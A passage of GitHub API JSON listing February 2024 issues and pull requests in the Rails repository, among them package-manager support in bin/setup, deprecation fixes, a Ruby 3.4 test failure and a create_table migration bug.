        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51077/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51077/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51077/events",
        "html_url": "https://github.com/rails/rails/pull/51077",
        "id": 2133580492,
        "node_id": "PR_kwDNIULOZtGOKw",
        "number": 51077,
        "title": "Add PNPM and NPM support in bin/setup script",
        "user": {
            "login": "anonychun",
            "id": 41361100,
            "node_id": "MDQ6VXNlcjQxMzYxMTAw",
            "avatar_url": "https://avatars.githubusercontent.com/u/41361100?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/anonychun",
            "html_url": "https://github.com/anonychun",
            "followers_url": "https://api.github.com/users/anonychun/followers",
            "following_url": "https://api.github.com/users/anonychun/following{/other_user}",
            "gists_url": "https://api.github.com/users/anonychun/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/anonychun/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/anonychun/subscriptions",
            "organizations_url": "https://api.github.com/users/anonychun/orgs",
            "repos_url": "https://api.github.com/users/anonychun/repos",
            "events_url": "https://api.github.com/users/anonychun/events{/privacy}",
            "received_events_url": "https://api.github.com/users/anonychun/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-14T05:36:22Z",
        "updated_at": "2024-02-14T18:00:28Z",
        "closed_at": "2024-02-14T17:59:19Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51077",
            "html_url": "https://github.com/rails/rails/pull/51077",
            "diff_url": "https://github.com/rails/rails/pull/51077.diff",
            "patch_url": "https://github.com/rails/rails/pull/51077.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nCurrently, the Rails setup script only supports yarn as the package manager. This limits users who prefer pnpm or npm and can create friction during project bootstrapping.\r\n\r\nProviding official support for both these package managers would:\r\n- Enhance user experience and choice: Cater to a wider range of developer preferences, enabling seamless project initialization regardless of package manager preference.\r\n- Promote inclusivity and flexibility: Embrace the diversity of tooling choices within the community.\r\n\r\n### Detail\r\n\r\nThis pull request adds support for pnpm and npm to the Rails setup script in the following ways:\r\n\r\n- pnpm:\r\n  - Detects existing pnpm-lock.yaml file for initialization.\r\n  - Installs dependencies using pnpm install --verify --lockfile.\r\n- npm:\r\n  - Detects existing package-lock.json file for initialization.\r\n  - Installs dependencies using npm install.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51077/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51077/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51076",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51076/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51076/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51076/events",
        "html_url": "https://github.com/rails/rails/pull/51076",
        "id": 2133470774,
        "node_id": "PR_kwDNIULOZtAVMA",
        "number": 51076,
        "title": "Address `Defining enums with keyword arguments` warning in Action Mai",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-14T03:15:12Z",
        "updated_at": "2024-02-14T04:53:37Z",
        "closed_at": "2024-02-14T04:53:37Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51076",
            "html_url": "https://github.com/rails/rails/pull/51076",
            "diff_url": "https://github.com/rails/rails/pull/51076.diff",
            "patch_url": "https://github.com/rails/rails/pull/51076.patch",
            "merged_at": "2024-02-14T04:53:37Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis commit addresses `DEPRECATION WARNING: Defining enums with keyword arguments is deprecated and will be removed` warning in Action Mailbox.\r\n\r\n### Detail\r\n\r\n* Steps to reproduce\r\n```ruby\r\ngit clone https://github.com/rails/rails\r\ncd rails/actionmailbox\r\nbundle install\r\nbin/test test/unit/router_test.rb\r\n```\r\n\r\n* Without this commit\r\n```ruby\r\n$ bin/test test/unit/router_test.rb\r\n... snip ..\r\nDEPRECATION WARNING: Defining enums with keyword arguments is deprecated and will be removed\r\nin Rails 7.3. Positional arguments should be used instead:\r\n\r\nenum :status, [:pending, :processing, :delivered, :failed, :bounced]\r\n (called from <class:InboundEmail> at /home/yahonda/src/github.com/rails/rails/actionmailbox/app/models/action_mailbox/inbound_email.rb:31)\r\nRun options: --seed 65254\r\n\r\n...............\r\n\r\nFinished in 0.230357s, 65.1163 runs/s, 108.5271 assertions/s.\r\n15 runs, 25 assertions, 0 failures, 0 errors, 0 skips\r\n$\r\n```\r\n\r\n### Additional information\r\nFollow up https://github.com/rails/rails/pull/50987\r\nRefer to https://github.com/rails/rails/pull/51037\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51076/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51076/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51075",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51075/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51075/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51075/events",
        "html_url": "https://github.com/rails/rails/issues/51075",
        "id": 2133374351,
        "node_id": "I_kwDNIULOfyi1jw",
        "number": 51075,
        "title": "`DuplicableTest#test_duplicable` failure with ruby 3.4.0dev ",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 776781281,
                "node_id": "MDU6TGFiZWw3NzY3ODEyODE=",
                "url": "https://api.github.com/repos/rails/rails/labels/ci%20issues",
                "name": "ci issues",
                "color": "aaafff",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-14T01:01:02Z",
        "updated_at": "2024-02-14T09:33:58Z",
        "closed_at": "2024-02-14T09:33:58Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "Managed to reproduce CI failure at https://buildkite.com/rails/rails-nightly/builds/165#018da4eb-5216-4c18-b84b-32e067fdb17a/1250-1260\r\n\r\n### Steps to reproduce\r\n- Install ruby 3.4.0dev that includes https://github.com/ruby/ruby/commit/de1a586ecc2ee7f465f0c0a69291054136a3a819\r\n```ruby\r\ngit clone https://github.com/rails/rails\r\ncd rails\r\nrm Gemfile.lock\r\nbundle install\r\ncd activesupport\r\nbin/test test/core_ext/object/duplicable_test.rb -n test_duplicable\r\n```\r\n\r\n### Expected behavior\r\nIt should pass.\r\n\r\n### Actual behavior\r\nIt fails as follows.\r\n\r\n```ruby\r\nF\r\n\r\nFailure:\r\nDuplicableTest#test_duplicable [test/core_ext/object/duplicable_test.rb:15]:\r\nMethod.\r\nTypeError expected but nothing was raised.\r\n\r\n\r\nbin/test test/core_ext/object/duplicable_test.rb:12\r\n\r\n\r\n\r\nFinished in 0.000362s, 2762.5911 runs/s, 5525.1823 assertions/s.\r\n1 runs, 2 assertions, 1 failures, 0 errors, 0 skips\r\n$\r\n```\r\n\r\n### System configuration\r\n**Rails version**: main branch\r\n\r\n**Ruby version**: ruby 3.4.0dev (2024-02-12T17:31:48Z master de1a586ecc) [x86_64-linux]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51075/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51075/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51074",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51074/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51074/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51074/events",
        "html_url": "https://github.com/rails/rails/issues/51074",
        "id": 2133372609,
        "node_id": "I_kwDNIULOfyiuwQ",
        "number": 51074,
        "title": "Add a `--db-prepare` option to run check and run migrations when booting the server",
        "user": {
            "login": "bensheldon",
            "id": 47554,
            "node_id": "MDQ6VXNlcjQ3NTU0",
            "avatar_url": "https://avatars.githubusercontent.com/u/47554?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bensheldon",
            "html_url": "https://github.com/bensheldon",
            "followers_url": "https://api.github.com/users/bensheldon/followers",
            "following_url": "https://api.github.com/users/bensheldon/following{/other_user}",
            "gists_url": "https://api.github.com/users/bensheldon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bensheldon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bensheldon/subscriptions",
            "organizations_url": "https://api.github.com/users/bensheldon/orgs",
            "repos_url": "https://api.github.com/users/bensheldon/repos",
            "events_url": "https://api.github.com/users/bensheldon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bensheldon/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T00:58:47Z",
        "updated_at": "2024-02-14T00:58:47Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "The current docker entrypoint will slow down starting `rails server` because it will first load _another_ Rails process to check and run database migrations (which is necessary because not all runtime platforms support deployment tasks):\r\n\r\nhttps://github.com/rails/rails/blob/fc9ed119c718ea0654e4a5d2477d8391252cbe6b/railties/lib/rails/generators/rails/app/templates/docker-entrypoint.tt#L10-L12\r\n\r\nIt would be nice if something like a `bin/rails --db-prepare` flag existed that could check for migrations (and run them) if necessary and only have to boot a single Rails app and thus boot the server faster.\r\n\r\nWhile briefly talking through this with @matthewd, he imagined it might be able to work like this:\r\n\r\n- Do a check if migrations are needed inline while booting the Rails server\r\n- If there are pending migrations, run a subprocess (or fork, if possible) that would be equivalent to the `db:prepare` task.\r\n\r\nWe considered but didn't think it would be safe to also run the migrations in the _same_ `rails server` process because it's possible it could leak database connections or other state. ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51074/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51074/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51073",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51073/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51073/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51073/events",
        "html_url": "https://github.com/rails/rails/pull/51073",
        "id": 2133017475,
        "node_id": "PR_kwDNIULOZsoHng",
        "number": 51073,
        "title": "Match default thread count to puma setting everywhere",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-13T19:43:47Z",
        "updated_at": "2024-02-13T23:31:38Z",
        "closed_at": "2024-02-13T23:31:38Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51073",
            "html_url": "https://github.com/rails/rails/pull/51073",
            "diff_url": "https://github.com/rails/rails/pull/51073.diff",
            "patch_url": "https://github.com/rails/rails/pull/51073.patch",
            "merged_at": null
        },
        "body": "We've changed the default thread count from 5 to 3 in the puma config. We should match that everywhere.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51073/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51073/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51072",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51072/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51072/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51072/events",
        "html_url": "https://github.com/rails/rails/pull/51072",
        "id": 2132992086,
        "node_id": "PR_kwDNIULOZsmwyw",
        "number": 51072,
        "title": "Raise error for Trilogy when `prepared_statements` is `true`",
        "user": {
            "login": "eileencodes",
            "id": 1080678,
            "node_id": "MDQ6VXNlcjEwODA2Nzg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1080678?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eileencodes",
            "html_url": "https://github.com/eileencodes",
            "followers_url": "https://api.github.com/users/eileencodes/followers",
            "following_url": "https://api.github.com/users/eileencodes/following{/other_user}",
            "gists_url": "https://api.github.com/users/eileencodes/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eileencodes/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eileencodes/subscriptions",
            "organizations_url": "https://api.github.com/users/eileencodes/orgs",
            "repos_url": "https://api.github.com/users/eileencodes/repos",
            "events_url": "https://api.github.com/users/eileencodes/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eileencodes/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-13T19:23:59Z",
        "updated_at": "2024-02-13T20:09:21Z",
        "closed_at": "2024-02-13T20:08:59Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51072",
            "html_url": "https://github.com/rails/rails/pull/51072",
            "diff_url": "https://github.com/rails/rails/pull/51072.diff",
            "patch_url": "https://github.com/rails/rails/pull/51072.patch",
            "merged_at": "2024-02-13T20:08:59Z"
        },
        "body": "Trilogy doesn't currently support prepared statements. The error that applications would see is a `StatementInvalid` error. This doesn't quite point you to the fact this isn't supported. So raise a more appropriate error pointing to what to change.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51072/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51072/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51071",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51071/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51071/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51071/events",
        "html_url": "https://github.com/rails/rails/pull/51071",
        "id": 2132906570,
        "node_id": "PR_kwDNIULOZsiP8g",
        "number": 51071,
        "title": "Fix #51067 create_table if_not_exists guard S prevent force drop_table",
        "user": {
            "login": "allisonphillips",
            "id": 8813886,
            "node_id": "MDQ6VXNlcjg4MTM4ODY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8813886?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/allisonphillips",
            "html_url": "https://github.com/allisonphillips",
            "followers_url": "https://api.github.com/users/allisonphillips/followers",
            "following_url": "https://api.github.com/users/allisonphillips/following{/other_user}",
            "gists_url": "https://api.github.com/users/allisonphillips/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/allisonphillips/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/allisonphillips/subscriptions",
            "organizations_url": "https://api.github.com/users/allisonphillips/orgs",
            "repos_url": "https://api.github.com/users/allisonphillips/repos",
            "events_url": "https://api.github.com/users/allisonphillips/events{/privacy}",
            "received_events_url": "https://api.github.com/users/allisonphillips/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T18:20:19Z",
        "updated_at": "2024-02-14T16:40:57Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51071",
            "html_url": "https://github.com/rails/rails/pull/51071",
            "diff_url": "https://github.com/rails/rails/pull/51071.diff",
            "patch_url": "https://github.com/rails/rails/pull/51071.patch",
            "merged_at": null
        },
        "body": "Solving https://github.com/rails/rails/issues/51067\r\n\r\nI'm only familiar with writing rails tests in rspec, I wrote a test after skimming the other syntax in the file but please let me know if there is a better way. `record.reload` should raise an exception if the record was deleted by `create_table` dropping the table.\r\n\r\n> [!NOTE]\r\n> Currently limited to a web editor so I don't have the ability to squash commits or run the full test suite, will try to grab some time to clean up the branch and validate tests when my personal machine is accessible\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because https://github.com/rails/rails/issues/51067\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `create_table` to ignore the `force` option (which drops the table) if the `if_not_exists` option is present\r\n\r\n### Additional information\r\n\r\nIf you copy a `create_table` migration from a schema dump and add the `if_not_exists` guard but forget to remove `force`, it will drop your table when you migrate it. \r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51071/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51071/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51070",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51070/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51070/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51070/events",
        "html_url": "https://github.com/rails/rails/pull/51070",
        "id": 2132895419,
        "node_id": "PR_kwDNIULOZshpMw",
        "number": 51070,
        "title": "Add support join types in where.associated method",
        "user": {
            "login": "saleh-alhaddad",
            "id": 60958871,
            "node_id": "MDQ6VXNlcjYwOTU4ODcx",
            "avatar_url": "https://avatars.githubusercontent.com/u/60958871?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/saleh-alhaddad",
            "html_url": "https://github.com/saleh-alhaddad",
            "followers_url": "https://api.github.com/users/saleh-alhaddad/followers",
            "following_url": "https://api.github.com/users/saleh-alhaddad/following{/other_user}",
            "gists_url": "https://api.github.com/users/saleh-alhaddad/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/saleh-alhaddad/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/saleh-alhaddad/subscriptions",
            "organizations_url": "https://api.github.com/users/saleh-alhaddad/orgs",
            "repos_url": "https://api.github.com/users/saleh-alhaddad/repos",
            "events_url": "https://api.github.com/users/saleh-alhaddad/events{/privacy}",
            "received_events_url": "https://api.github.com/users/saleh-alhaddad/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T18:12:39Z",
        "updated_at": "2024-02-22T04:41:10Z",
        "closed_at": "2024-02-14T06:14:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51070",
            "html_url": "https://github.com/rails/rails/pull/51070",
            "diff_url": "https://github.com/rails/rails/pull/51070.diff",
            "patch_url": "https://github.com/rails/rails/pull/51070.patch",
            "merged_at": null
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51070/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51070/timeline",
